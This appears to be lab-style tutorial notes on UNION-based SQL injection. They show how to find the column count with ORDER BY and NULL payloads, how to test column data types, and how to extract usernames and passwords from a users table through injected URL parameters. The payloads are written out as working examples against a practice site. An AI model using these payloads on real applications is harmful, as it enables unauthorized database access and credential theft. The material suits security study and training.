In cases where results of SQL queries are returned within application responses attacker can leverage SQLi to retrieve information from other tables within this DB. It's done by using **UNION** keyword which allows to add another **SELECT** in query and append it into the original query.   
  
  
SELECT a, b FROM table1 UNION SELECT c, d FROM table2   
  
The SQL query will return a single result set with two columns, containing values form columns a, b from table1 and columns c, d from table2, one below another (columns are extended with data from other tables).  
  
Original query:

 Modified input:  
   
 ![images/1099-2.png](images/1099-2.png)  
  
It lists all usernames and passwords inside users table, along with originally requested products.   
  
**UNION attacks**  
  
For UNION attack to work, two requirements must be met:  
  
• individual queries must return the same number of columns  
• data types in each column must be compatible between individual queries  
  
Which means that before the attack two things need to be checked:  
  
• how many columns are being returned from the original query  
• which columns returned from the original query have the same data type as the one we want to retrieve from injected query  
  
 **Determining number of columns**  
   
 There are two effective methods for this task:  
   
 1. Injecting couple or **ORDER BY** statements.  
   
 ' ORDER BY 1--  
 ' ORDER BY 2--  
 ' ORDER BY 3--  
 etc.  
   
 When page start to return errors, or nothing will start to change it means that our query has reached beyond available number of columns.  
   
 Example  
   
 academy.net/filter?category=Lifestyle' ORDER BY 1--  
 ![images/1099-3.png](images/1099-3.png)  
   
 academy.net/filter?category=Lifestyle' ORDER BY 2--  
 ![images/1099-4.png](images/1099-4.png)  
   
 academy.net/filter?category=Lifestyle' ORDER BY 3--  
 ![images/1099-5.png](images/1099-5.png)  
   
 2. Injecting couple of **UNION SELECT** payloads with **NULL**  
   
 Trial and error method which appends to original query another columns with no values (NULL). It has to be tested couple of times, to determine on which quantity of NULL columns, page will stop sending errors.  
   
 ' UNION SELECT NULL--  
 ' UNION SELECT NULL, NULL--  
 ' UNION SELECT NULL, NULL, NULL--  
 etc.  
   
 Results can be different depending on app's code. In best scenario an extra row should appear on HTML table. In some cases NULL values might trigger a different error, such as “**NullPointerException**”. Worst case is that the response won't differ from original query, meaning with this method we cannot determin number of returned columns.  
   
 In this method a NULL value is used, because it's compatible with every commonly used data type.   
   
 In ORACLE every SELECT statement must use a FROM keyword and specify a valid table. In ORACLE is special table called “**dual**” which can be used for such purpose.  
   
 In MySQL comment at the end of injected query must be followed by a whitespace, alternatively by hash “#” to identify a comment.  
   
 **Finding columns with a useful data type**  
   
 Second requirement is to match data types of original query and injected one. To test what type of values are present in particular columns following payload can be injected (assuming there are three columns in original query).  
   
 ‘ UNION SELECT ’a', NULL, NULL--  
 ‘ UNION SELECT NULL, ’a', NULL--  
 ‘ UNION SELECT NULL, NULL, ’a'--  
   
 At each query if data is not compatible with injected string page will return an error.  
   
 academy.net/filter?category=Lifestyle' UNION SELECT 'a', NULL, NULL--  
   
 ![images/1099-6.png](images/1099-6.png)  
   
 academy.net/filter?category=Lifestyle' UNION SELECT NULL,'a', NULL--

 **Retrieving data from other tables**  
   
 It's possible to extract user information from users table using UNION attack. Knowing number of returned columns and it's data type, we can merge usernames and password into original query.  
   
 academy.net/filter?category=Pets' UNION SELECT username, password FROM users--  
   
 or   
   
 academy.net/filter?category=Pets' UNION SELECT \* FROM users--  
   
 ![images/1099-8.png](images/1099-8.png)  
   
   
 **Retrieving multiple vales within a single column**  
  
 Nevertheless it seems like query returns a single column, after “NULL test" it looks like it uses two, so the first one has to be empty.   
   
 academy.net/filter?category=Pets' UNION SELECT NULL, username || ‘:’ || password FROM users--
